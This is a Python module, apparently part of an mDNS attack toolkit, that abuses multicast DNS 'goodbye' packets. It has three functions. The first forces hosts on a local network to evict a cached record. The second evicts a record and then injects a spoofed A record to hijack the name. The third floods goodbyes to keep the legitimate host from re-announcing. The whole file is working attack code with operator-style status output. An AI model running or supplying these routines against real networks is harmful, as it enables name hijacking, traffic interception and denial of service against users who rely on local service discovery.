"""
goodbye.py - Goodbye packet abuse (forced cache eviction).

Sends TTL=0 responses to force all hosts to delete a cached record.
Requires knowing the exact rdata of the target record.

Can be used standalone (DoS) or as setup for hijacking (evict then replace).
"""

import time
import sys

sys.path.insert(0, __file__.rsplit("/", 2)[0])
from mdns_core import (make_mdns_socket, send_mdns, build_goodbye, build_response,
                       rdata_a, rdata_aaaa, rdata_srv, rdata_ptr,
                       A, AAAA, PTR, SRV, CACHE_FLUSH)


def evict_a_record(name: str, current_ip: str, iface: str | None = None):
    """Send a goodbye for an A record (must know current IP)."""
    sock = make_mdns_socket(iface)
    pkt = build_goodbye(name, A, rdata_a(current_ip))
    send_mdns(sock, pkt)
    print(f"[+] Goodbye sent: {name} A {current_ip} (TTL=0)")
    print(f"    Record will be evicted from all caches in ~1 second")
    sock.close()


def evict_and_replace(name: str, current_ip: str, new_ip: str,
                      iface: str | None = None, ttl: int = 4500,
                      delay: float = 1.1):
    """
    Two-step hijack: goodbye the legitimate record, then inject ours.

    The 1.1s delay ensures the goodbye has taken effect before the replacement
    arrives (victims delete goodbye'd records after 1 second).
    """
    sock = make_mdns_socket(iface)

    # Step 1: goodbye the legitimate record
    goodbye = build_goodbye(name, A, rdata_a(current_ip))
    send_mdns(sock, goodbye)
    print(f"[+] Step 1: Goodbye sent for {name} A {current_ip}")

    # Wait for caches to evict
    print(f"[*] Waiting {delay}s for cache eviction...")
    time.sleep(delay)

    # Step 2: inject our replacement
    replacement = build_response(name, A, rdata_a(new_ip), ttl=ttl, cache_flush=True)
    send_mdns(sock, replacement)
    print(f"[+] Step 2: Replacement sent: {name} A -> {new_ip} (TTL={ttl})")
    sock.close()


def flood_goodbye(name: str, current_ip: str, iface: str | None = None,
                  count: int = 50, interval: float = 0.5):
    """
    Repeatedly send goodbyes to keep a record permanently evicted.
    Prevents the legitimate owner from re-announcing successfully
    (the 1-second rescue window is too short if goodbyes keep arriving).
    """
    sock = make_mdns_socket(iface)
    pkt = build_goodbye(name, A, rdata_a(current_ip))

    print(f"[*] Flooding goodbyes for {name} A {current_ip} (count={count})")
    try:
        for i in range(count):
            send_mdns(sock, pkt)
            if (i + 1) % 10 == 0:
                print(f"  [{i+1}/{count}] goodbyes sent")
            time.sleep(interval)
    except KeyboardInterrupt:
        pass
    print(f"[*] Done")
    sock.close()


def run(name: str, current_ip: str, iface: str | None = None,
        new_ip: str | None = None, flood: bool = False, count: int = 50):
    if new_ip:
        evict_and_replace(name, current_ip, new_ip, iface)
    elif flood:
        flood_goodbye(name, current_ip, iface, count=count)
    else:
        evict_a_record(name, current_ip, iface)
